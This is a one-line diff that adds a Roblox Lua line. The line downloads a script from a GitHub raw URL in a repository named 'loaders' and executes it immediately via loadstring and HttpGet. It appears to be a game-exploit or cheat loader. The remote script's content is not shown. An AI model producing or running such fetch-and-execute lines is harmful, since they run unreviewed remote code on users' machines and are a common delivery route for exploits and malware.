@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/7-days-cat-sitting-spam6-hsla2iddhrlso1.lua"))()
